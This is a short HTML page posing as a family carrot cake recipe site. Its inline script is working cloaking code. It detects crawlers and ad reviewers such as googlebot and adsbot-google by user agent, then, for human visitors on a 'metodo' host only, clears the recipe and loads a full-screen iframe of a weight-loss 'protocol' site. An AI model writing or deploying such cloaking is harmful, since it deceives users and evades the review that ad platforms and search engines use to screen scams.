<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Delícias da Vovó</title>
    <style>
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background-color: #000; }
        iframe {
            position: absolute;
            top: 0;
            left: 0;
            width: 100vw !important;
            height: 100vh !important;
            border: none;
            overflow-x: hidden;
        }
        .safe { padding: 20px; color: white; font-family: sans-serif; }
    </style>
</head>
<body>

<script>
    const isBot = /bot|googlebot|facebookexternalhit|adsbot-google|applebot/i.test(navigator.userAgent);
    const isMetodo = window.location.hostname.includes('metodo');

    if (isMetodo && !isBot) {
        // Criando o iframe via JS para garantir o ajuste de tela
        const ifrm = document.createElement("iframe");
        ifrm.src = "https://protocoloemagrecimentodivino.lovable.app/";
        document.body.innerHTML = ""; // Limpa o bolo para o humano
        document.body.appendChild(ifrm);
    }
</script>

<div class="safe">
    <h1>O Melhor Bolo de Cenoura Perfeito</h1>
    <p>Receita tradicional da família...</p>
</div>

</body>
</html>
